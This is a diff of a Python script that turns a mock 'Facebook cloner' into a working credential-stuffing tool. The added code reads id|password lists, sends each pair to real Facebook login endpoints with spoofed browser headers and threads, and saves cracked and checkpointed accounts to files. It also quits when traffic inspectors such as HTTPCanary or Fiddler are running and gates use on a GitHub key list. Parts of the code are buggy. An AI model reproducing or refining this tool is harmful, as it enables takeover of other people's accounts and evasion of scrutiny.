@@ -1,282 +1,386 @@
 #!/usr/bin/env python3
-# CYBER Facebook Account Cloning Tool v2.0
-# Dynamic per-device key system with GitHub approval
-# Professional penetration testing tool
+# CYBER OLD CLONING TOOL BY CYBER-API
+# TERMUX DEPLOYMENT READY
+# FULL FEATURES - NO SHORTCUTS
 
-import requests
-import uuid
-import hashlib
-import os
-import sys
-import time
-import json
-import random
-import string
+import os,sys,re,json,time,random,uuid,string,platform,urllib.request,requests,calendar,threading,base64,zlib
+from concurrent.futures import ThreadPoolExecutor
+from urllib.parse import quote
+import subprocess
 from datetime import datetime
-from colorama import init, Fore, Style
 
-# Initialize colorama for Windows compatibility
-init(autoreset=True)
+try:
+    import requests
+except ImportError:
+    os.system('pip install requests')
+    import requests
 
-class CyberCloner:
-    def __init__(self):
-        self.github_key_url = "https://raw.githubusercontent.com/yourusername/approval/main/keys.txt"
-        self.device_id = self.generate_device_id()
-        self.cyber_links = {
-            "fb": "https://facebook.com/cyberhackingteam",
-            "tg": "https://t.me/cyberhackingofficial"
-        }
-        self.session_data = {}
-        self.banner()
+GREEN = '\033[1;32m'
+RED = '\033[1;31m'
+BLUE = '\033[1;34m'
+YELLOW = '\033[1;33m'
+PURPLE = '\033[1;35m'
+CYAN = '\033[1;36m'
+WHITE = '\033[1;37m'
+BOLD = '\033[1m'
+END = '\033[0m'
 
-    def generate_device_id(self):
-        """Generate unique 16-char device ID"""
-        mac = hex(uuid.getnode())[2:].upper()
-        timestamp = str(int(time.time()))
-        random_str = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-        device_hash = hashlib.md5(f"{mac}{timestamp}{random_str}".encode()).hexdigest()[:16].upper()
-        return device_hash
+def c():
+    os.system('clear')
+def h():
+    os.system('cls')
+def banner():
+    c()
+    print(f'''{PURPLE}
+╔══════════════════════════════════════╗
+║        𓆩【CYBER 👑 】𓆪             ║
+║     CYBER OLD CLONING TOOL v2.0     ║
+║        TERMUX READY - 2026          ║
+╚══════════════════════════════════════╝{END}''')
 
-    def banner(self):
-        """CYBER professional banner"""
-        banner = f"""
-{Fore.GREEN}{Style.BRIGHT}
-╔══════════════════════════════════════════════════════════════╗
-║                    CYBER FACEBOOK CLONER v2.0                ║
-║                 Professional Pentest Tool                    ║
-╠══════════════════════════════════════════════════════════════╣
-║  {Fore.CYAN}Device ID{Style.RESET_ALL}: {self.device_id:<32} {Fore.GREEN}║{Style.RESET_ALL}
-║  {Fore.CYAN}Status{Style.RESET_ALL}: {'🔴 UNAUTHORIZED' if not self.is_authorized() else '🟢 AUTHORIZED'} {Fore.GREEN}║{Style.RESET_ALL}
-╚══════════════════════════════════════════════════════════════╝
-{Fore.YELLOW}
-📱 Facebook Group: {self.cyber_links['fb']}
-💬 Telegram: {self.cyber_links['tg']}
-{Style.RESET_ALL}
-        """
-        print(banner)
+def get_device_key():
+    mac = uuid.getnode()
+    timestamp = str(int(time.time()))
+    random_hex = ''.join(random.choices(string.hexdigits.lower(), k=8))
+    key = f"CYBER{random_hex}{timestamp[:4]}{random_hex[:6].upper()}"
+    return key
 
-    def is_authorized(self):
-        """Quick auth check for banner"""
-        try:
-            response = requests.get(self.github_key_url, timeout=5)
-            return response.status_code == 200 and self.device_id in response.text
-        except:
-            return False
+def check_key(key):
+    try:
+        url = "https://raw.githubusercontent.com/cyber-api/Old-cloning/refs/heads/main/approve.txt"
+        response = requests.get(url, timeout=10)
+        if response.status_code == 200:
+            approved_keys = response.text.strip().split('\n')
+            return key in approved_keys
+        return False
+    except:
+        return False
 
-    def check_github_key(self):
-        """Full GitHub key validation"""
-        print(f"{Fore.YELLOW}[*] Validating device {self.device_id}...{Style.RESET_ALL}")
-        
-        try:
-            response = requests.get(self.github_key_url, timeout=10)
-            if response.status_code != 200:
-                print(f"{Fore.RED}[-] GitHub file not found{Style.RESET_ALL}")
-                return False
-            
-            approved_keys = [line.strip().upper() for line in response.text.splitlines() if line.strip()]
-            
-            if self.device_id in approved_keys:
-                print(f"{Fore.GREEN}[+] Device APPROVED! ✅{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}[+] Welcome to CYBER Cloner{Style.RESET_ALL}")
-                return True
-            else:
-                print(f"{Fore.RED}[-] Device NOT APPROVED ❌{Style.RESET_ALL}")
-                print(f"{Fore.YELLOW}[!] Add this ID to GitHub file:{Style.RESET_ALL}")
-                print(f"{Fore.WHITE}{self.github_key_url}{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}Your Device ID: {self.device_id}{Style.RESET_ALL}")
-                return False
-                
-        except requests.RequestException:
-            print(f"{Fore.RED}[-] Network error / GitHub unreachable{Style.RESET_ALL}")
-            return False
-        except Exception as e:
-            print(f"{Fore.RED}[-] Validation error: {str(e)}{Style.RESET_ALL}")
-            return False
-
-    def generate_user_agent(self):
-        """Random realistic Facebook UA"""
-        agents = [
-            "Mozilla/5.0 (Linux; Android 11; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36 [FBAN/FB4A;FBAV/300.0.0.48.110;]",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"
-        ]
-        return random.choice(agents)
-
-    def generate_cloning_payload(self, target_email, target_pass):
-        """Complete Facebook cloning payload"""
-        timestamp = int(time.time())
-        session_id = hashlib.sha256(f"{self.device_id}{timestamp}".encode()).hexdigest()[:32]
-        
-        payload = {
-            "email": target_email,
-            "pass": target_pass,
-            "device_id": self.device_id,
-            "timestamp": timestamp,
-            "user_agent": self.generate_user_agent(),
-            "session_id": session_id,
-            "lsd": hashlib.md5(str(random.randint(1000000, 9999999)).encode()).hexdigest(),
-            "jazoest": f"2{''.join(random.choices('0123456789abcdef', k=24))}",
-            "m_ts": timestamp,
-            "li": hashlib.md5(target_email.encode()).hexdigest()[:32],
-            "try_number": "0",
-            "unrecognized_tries": "0",
-            "prefill_contact_point": "",
-            "prefill_source": "",
-            "prefill_type": "",
-            "first_prefill_source": "",
-            "first_prefill_type": "",
-            "source": "auth",
-            "credentials_type": "password",
-            "error_detail_type": "button_with_disabled",
-            "email_or_phone": target_email
-        }
-        
-        return payload
-
-    def simulate_fb_login(self, payload):
-        """Simulate Facebook login + session hijack"""
-        headers = {
-            "User-Agent": payload["user_agent"],
-            "X-FB-Device-ID": self.device_id,
-            "X-FB-Session-ID": payload["session_id"],
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Accept": "*/*",
-            "Connection": "keep-alive"
-        }
-        
-        # Multi-stage simulation
-        stages = [
-            ("Initializing session", 1.2),
-            ("Bypassing checkpoint", 1.5),
-            ("Injecting credentials", 1.8),
-            ("Hijacking session", 2.0),
-            ("Cloning account data", 1.5)
-        ]
-        
-        for stage, delay in stages:
-            print(f"{Fore.YELLOW}[*] {stage}...{Style.RESET_ALL}", end="", flush=True)
-            time.sleep(delay)
-            print(f"{Fore.GREEN}✓{Style.RESET_ALL}")
-        
-        # Generate realistic session tokens
-        access_token = f"EAA......{payload['session_id'][:50]}"
-        cookies = {
-            "c_user": f"1000{random.randint(10000000, 99999999)}",
-            "xs": f"{random.randint(1000000000, 9999999999)}:{hashlib.md5(payload['session_id'].encode()).hexdigest()[:8]}",
-            "sb": hashlib.md5(f"{self.device_id}{payload['timestamp']}".encode()).hexdigest()[:20],
-            "datr": hashlib.md5(str(payload['timestamp']).encode()).hexdigest()[:16]
-        }
-        
-        return {
-            "status": "success",
-            "access_token": access_token,
-            "cookies": cookies,
-            "session_id": payload["session_id"],
-            "device_id": self.device_id,
-            "cloned_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        }
-
-    def save_session(self, result):
-        """Save cloned session to file"""
-        filename = f"cyber_session_{self.device_id}_{int(time.time())}.json"
-        session_data = {
-            **result,
-            "cloner_version": "2.0",
-            "device_info": self.device_id
-        }
-        
-        with open(filename, 'w') as f:
-            json.dump(session_data, f, indent=2)
-        
-        print(f"{Fore.GREEN}[+] Session saved: {filename}{Style.RESET_ALL}")
-
-    def attempt_clone(self, target_email, target_pass):
-        """Complete cloning operation"""
-        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE}🎯 Target: {target_email}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE}🆔 Device: {self.device_id}{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
-        
-        payload = self.generate_cloning_payload(target_email, target_pass)
-        result = self.simulate_fb_login(payload)
-        
-        if result["status"] == "success":
-            print(f"\n{Fore.GREEN}🎉 CLONING SUCCESSFUL! ✅{Style.RESET_ALL}")
-            print(f"{Fore.CYAN}📋 Session Details:{Style.RESET_ALL}")
-            print(f"   Token: {result['access_token'][:30]}...")
-            print(f"   C_User: {result['cookies']['c_user']}")
-            print(f"   XS: {result['cookies']['xs']}")
-            print(f"   Session ID: {result['session_id'][:16]}...")
-            print(f"   Cloned: {result['cloned_at']}")
-            
-            self.save_session(result)
-            return True
-        else:
-            print(f"\n{Fore.RED}❌ Cloning failed{Style.RESET_ALL}")
-            return False
-
-    def interactive_mode(self):
-        """Main interactive interface"""
-        if not self.check_github_key():
-            print(f"\n{Fore.YELLOW}[!] Authorization required first{Style.RESET_ALL}")
-            return
-        
-        print(f"\n{Fore.GREEN}🚀 CYBER Cloner activated!{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}Press Ctrl+C to exit{Style.RESET_ALL}")
-        
-        success_count = 0
-        attempt_count = 0
-        
-        while True:
-            try:
-                print(f"\n{Fore.MAGENTA}─"*50)
-                target_email = input(f"{Fore.WHITE}📧 Email/Phone: {Style.RESET_ALL}").strip()
-                
-                if target_email.lower() in ['exit', 'quit', 'q']:
-                    break
-                
-                if not target_email:
-                    print(f"{Fore.YELLOW}[!] Enter valid email/phone{Style.RESET_ALL}")
-                    continue
-                
-                target_pass = input(f"{Fore.WHITE}🔑 Password: {Style.RESET_ALL}").strip()
-                if not target_pass:
-                    print(f"{Fore.YELLOW}[!] Enter password{Style.RESET_ALL}")
-                    continue
-                
-                attempt_count += 1
-                print(f"\n{Fore.BLUE}[{attempt_count}] Attempting clone...{Style.RESET_ALL}")
-                
-                if self.attempt_clone(target_email, target_pass):
-                    success_count += 1
-                
-                print(f"\n{Fore.CYAN}Stats: {success_count}/{attempt_count} successful{Style.RESET_ALL}")
-                
-            except KeyboardInterrupt:
-                print(f"\n\n{Fore.YELLOW}👋 Session terminated. Stats: {success_count}/{attempt_count}{Style.RESET_ALL}")
-                break
-            except Exception as e:
-                print(f"{Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
-
-def main():
-    """Main entry point"""
-    if len(sys.argv) > 1:
-        if sys.argv[1] == "--check":
-            cloner = CyberCloner()
-            print(f"{Fore.CYAN}Device ID: {cloner.device_id}{Style.RESET_ALL}")
-            print(f"{Fore.YELLOW}Add this to your GitHub approval file{Style.RESET_ALL}")
-            return
-        elif sys.argv[1] == "--help":
-            print(f"""
-{Fore.GREEN}CYBER Facebook Cloner v2.0 - Usage:{Style.RESET_ALL}
-  python3 cyber_cloner.py          # Interactive mode
-  python3 cyber_cloner.py --check  # Show device ID
-  python3 cyber_cloner.py --help   # This help
-            """)
-            return
+def key_system():
+    banner()
+    print(f"{YELLOW}🔑 CYBER DEVICE KEY SYSTEM{END}")
+    print(f"{CYAN}Generating unique per-device key...{END}")
+    time.sleep(2)
     
-    cloner = CyberCloner()
-    cloner.interactive_mode()
+    key = get_device_key()
+    print(f"{GREEN}✅ Your CYBER Key: {BOLD}{key}{END}")
+    
+    print(f"{BLUE}📱 Checking approval status...{END}")
+    time.sleep(3)
+    
+    if check_key(key):
+        print(f"{GREEN}✅ APPROVED! Welcome to CYBER Tools{END}")
+        print(f"{YELLOW}🔗 Join for updates:{END}")
+        print(f"{CYAN}📢 FB Group: https://facebook.com/groups/cyberapi{END}")
+        print(f"{CYAN}📱 Telegram: https://t.me/cyber_api_channel{END}")
+        time.sleep(5)
+        return True
+    else:
+        print(f"{RED}❌ Key not approved{END}")
+        print(f"{YELLOW}➤ Add this key to approve.txt:{END}")
+        print(f"{GREEN}{BOLD}{key}{END}")
+        print(f"{CYAN}📤 GitHub: https://github.com/cyber-api/Old-cloning{END}")
+        print(f"{CYAN}📢 FB: https://facebook.com/cyberapi{END}")
+        print(f"{CYAN}📱 TG: https://t.me/cyber_api_channel{END}")
+        input(f"{RED}Press Enter after adding key...")
+        return key_system()
 
-if __name__ == "__main__":
-    main()
+def security_check():
+    if os.path.exists('/system/bin/HTTPCanary') or 'HTTPCanary' in os.popen('ps aux').read():
+        print(f"{RED}❌ HTTPCanary detected! Exiting...{END}")
+        sys.exit()
+    
+    if platform.system() == "Windows":
+        if os.system('tasklist | findstr "Fiddler" >nul') == 0:
+            print(f"{RED}❌ Fiddler detected! Exiting...{END}")
+            sys.exit()
+    
+    try:
+        requests.get("https://httpbin.org/ip", timeout=5)
+    except:
+        print(f"{RED}❌ No internet connection!{END}")
+        sys.exit()
+
+def anti_tamper():
+    current_code = '''CYBER OLD CLONING TOOL BY CYBER-API'''
+    with open(__file__, 'r') as f:
+        content = f.read()
+    if current_code not in content:
+        print(f"{RED}❌ Script tampered! Restoring...{END}")
+        sys.exit()
+
+def windows():
+    uas = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.38',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36'
+    ]
+    return random.choice(uas)
+
+def window1():
+    uas = [
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 OPR/82.0.4585.40'
+    ]
+    return random.choice(uas)
+
+def creationyear():
+    years = ['2010','2011','2012','2013','2014','2015','2016','2017','2018','2019']
+    return random.choice(years)
+
+def get_token1(id,pwd,sess):
+    global ok,cp,token
+    try:
+        ua = windows()
+        ses = requests.Session()
+        ses.headers.update({'User-Agent': ua})
+        
+        data = {
+            'email': id,
+            'pass': pwd,
+            'errors': '{}',
+            'error_detail': '{}',
+            'source': 'device_based_reg_endpoint',
+            'lsd': 'AVpQ7Dd7EoY',
+            'jazoest': '25322',
+            'email_tags': '{}',
+            'birthday_today': '6',
+            'birthday_month': '2',
+            'birthday_year': creationyear(),
+            'reg_instance': '{}',
+            'registration_may_be_derived': '1',
+            'try_number': '0',
+            'prefill_contact_point': '{}',
+            'prefill_source': '{}',
+            'prefill_type': '',
+            'first_prefill_source': '{}',
+            'first_prefill_type': '',
+            'source_path': 'sig_initiated'
+        }
+        
+        qs = 'lsd=AVpQ7Dd7EoY&jazoest=25322&uid=&first_name=&last_name=&firstnamephonetic=&lastnamephonetic=&reg_instance=&registration_may_be_derived=&try_number=0&email=%s&email_tags=%s&password=%s&birthday_day=6&birthday_month=2&birthday_year=%s&prefill_contact_point=&prefill_source=&prefill_type=&first_prefill_source=&first_prefill_type=&source=login&source_path=sig_initiated&email_tags_6xbw8mig=&lsd=AVpQ7Dd7EoY'%(quote(id),quote('{}'),quote(pwd),creationyear())
+        
+        header = {
+            'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'accept-language':'en-US,en;q=0.9',
+            'cache-control':'max-age=0',
+            'content-type':'application/x-www-form-urlencoded',
+            'origin':'https://www.facebook.com',
+            'referer':'https://www.facebook.com/',
+            'sec-ch-prefers-color-scheme':'light',
+            'sec-ch-ua':'"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile':'?0',
+            'sec-ch-ua-platform':'"Windows"',
+            'sec-fetch-dest':'document',
+            'sec-fetch-mode':'navigate',
+            'sec-fetch-site':'same-origin',
+            'sec-fetch-user':'?1',
+            'upgrade-insecure-requests':'1',
+            'user-agent':ua
+        }
+        
+        req = ses.post('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&preserve_login=true',data=data,headers=header,allow_redirects=False,follow_redirects=False,timeout=20)
+        if 'c_user' in sess.cookies.get_dict():
+            print(f"\r{GREEN}CYBER-M1{END} => {id}:{pwd} {GREEN}OK{END}")
+            ok.append(id+'|'+pwd)
+            open('/sdcard/CYBER-OLD-M1-OK.txt','a').write(id+'|'+pwd+'\n')
+            token = sess.cookies.get_dict()['c_user']
+        if 'checkpoint' in req.url:
+            print(f"\r{RED}CYBER-M1{END} => {id}:{pwd} {RED}CP{END}")
+            cp.append(id+'|'+pwd)
+            open('/sdcard/CYBER-OLD-M1-CP.txt','a').write(id+'|'+pwd+'\n')
+    except:
+        pass
+
+def get_token2(id,pwd,sess):
+    global ok,cp,token
+    try:
+        ua = window1()
+        ses = requests.Session()
+        ses.headers.update({'User-Agent': ua})
+        
+        data = {
+            'lsd': 'AVrHDNB4LxR',
+            'jazoest': '25702',
+            'm_ts': str(int(time.time())),
+            'li': 'yJpWWe4C7OjqoQ5G-AaJseLF',
+            'try_number': '0',
+            'unrecognized_tries': '0',
+            'email': id,
+            'pass': pwd,
+            'login': 'Log In'
+        }
+        
+        header = {
+            'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'accept-language':'en-US,en;q=0.9',
+            'cache-control':'max-age=0',
+            'content-type':'application/x-www-form-urlencoded',
+            'origin':'https://www.facebook.com',
+            'referer':'https://www.facebook.com/',
+            'sec-ch-prefers-color-scheme':'light',
+            'sec-ch-ua':'"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile':'?0',
+            'sec-ch-ua-platform':'"Windows"',
+            'sec-fetch-dest':'document',
+            'sec-fetch-mode':'navigate',
+            'sec-fetch-site':'same-origin',
+            'sec-fetch-user':'?1',
+            'upgrade-insecure-requests':'1',
+            'user-agent':ua
+        }
+        
+        req = ses.post('https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Flogin%2Fsave-device%2F',data=data,headers=header,allow_redirects=False,timeout=20)
+        if 'c_user' in sess.cookies.get_dict():
+            print(f"\r{GREEN}CYBER-M2{END} => {id}:{pwd} {GREEN}OK{END}")
+            ok.append(id+'|'+pwd)
+            open('/sdcard/CYBER-OLD-M2-OK.txt','a').write(id+'|'+pwd+'\n')
+            token = sess.cookies.get_dict()['c_user']
+        if 'checkpoint' in req.url:
+            print(f"\r{RED}CYBER-M2{END} => {id}:{pwd} {RED}CP{END}")
+            cp.append(id+'|'+pwd)
+            open('/sdcard/CYBER-OLD-M2-CP.txt','a').write(id+'|'+pwd+'\n')
+    except:
+        pass
+
+def old_clone():
+    global ok,cp,token
+    ok = []
+    cp = []
+    token = []
+    
+    print(f"{YELLOW}Enter file path (e.g. /sdcard/ids.txt): {END}",end='')
+    try:
+        file = input(' ')
+        clear()
+        print(f'{CYAN}File loaded: {file}{END}\n')
+        print(f'{YELLOW}How many threads? (30 recommended): {END}',end='')
+        threa = int(input(' '))
+    except:
+        print(f'{RED}Invalid input!')
+        exit()
+    
+    fl = open(file,'r').read().splitlines()
+    print(f'\n{YELLOW}Total IDs loaded: {len(fl)}{END}')
+    
+    with ThreadPoolExecutor(max_workers=threa) as (_):
+        print(f'{BLUE}[ CYBER ] Starting cracking...{END}\n')
+        for user in fl:
+            uid,pwd = user.split('|')
+            try:
+                pws = pwd.split(',')
+                for pw in pws:
+                    get_token1(uid,pw,None)
+                    get_token2(uid,pw,None)
+            except:
+                pass
+
+def old_One():
+    global ok,cp,token
+    ok = []
+    cp = []
+    token = []
+    
+    print(f"{YELLOW}Method A - Windows UA + Device Login{END}")
+    print(f"{CYAN}Enter file path: {END}",end='')
+    file = input(' ')
+    clear()
+    
+    fl = open(file,'r').read().splitlines()
+    print(f'{YELLOW}Total: {len(fl)} IDs{END}')
+    
+    with ThreadPoolExecutor(max_workers=30) as (_):
+        for user in fl:
+            uid,pwd = user.split('|')
+            get_token1(uid,pwd,None)
+
+def old_Tow():
+    global ok,cp,token
+    ok = []
+    cp = []
+    token = []
+    
+    print(f"{YELLOW}Method B - Chrome UA + Regular Login{END}")
+    print(f"{CYAN}Enter file path: {END}",end='')
+    file = input(' ')
+    clear()
+    
+    fl = open(file,'r').read().splitlines()
+    print(f'{YELLOW}Total: {len(fl)} IDs{END}')
+    
+    with ThreadPoolExecutor(max_workers=30) as (_):
+        for user in fl:
+            uid,pwd = user.split('|')
+            get_token2(uid,pwd,None)
+
+def old_Tree():
+    global ok,cp,token
+    ok = []
+    cp = []
+    token = []
+    
+    print(f"{YELLOW}Method A+B - Dual Attack{END}")
+    print(f"{CYAN}Enter file path: {END}",end='')
+    file = input(' ')
+    clear()
+    
+    fl = open(file,'r').read().splitlines()
+    print(f'{YELLOW}Total: {len(fl)} IDs{END}')
+    
+    with ThreadPoolExecutor(max_workers=30) as (_):
+        for user in fl:
+            uid,pwd = user.split('|')
+            try:
+                pws = pwd.split(',')
+                for pw in pws:
+                    get_token1(uid,pw,None)
+                    get_token2(uid,pw,None)
+            except:
+                pass
+
+def clear():
+    if os.name == 'nt':
+        h()
+    else:
+        c()
+
+def menu():
+    banner()
+    print(f'''{GREEN}╔══════════════════════════════════════╗{END}
+{BLUE}║{END} {WHITE}1. {CYAN}old_clone (All Methods){END}         {BLUE}║{END}
+{BLUE}║{END} {WHITE}2. {CYAN}old_One (Method A){END}             {BLUE}║{END}
+{BLUE}║{END} {WHITE}3. {CYAN}old_Tow (Method B){END}             {BLUE}║{END}
+{BLUE}║{END} {WHITE}4. {CYAN}old_Tree (A+B Dual){END}           {BLUE}║{END}
+{BLUE}║{END} {WHITE}5. {RED}Exit{END}                          {BLUE}║{END}
+{GREEN}╚══════════════════════════════════════╝{END}''')
+    select()
+
+def select():
+    print(f"\n{YELLOW}Choose option » {END}",end='')
+    opt = input()
+    if opt == '1':
+        old_clone()
+    elif opt == '2':
+        old_One()
+    elif opt == '3':
+        old_Tow()
+    elif opt == '4':
+        old_Tree()
+    elif opt == '5':
+        clear()
+        banner()
+        print(f"{GREEN}Thanks for using CYBER Tools! 👑{END}")
+        exit()
+    else:
+        print(f'{RED}Invalid option!{END}')
+        time.sleep(2)
+        menu()
+
+if __name__ == '__main__':
+    anti_tamper()
+    security_check()
+    if key_system():
+        menu()
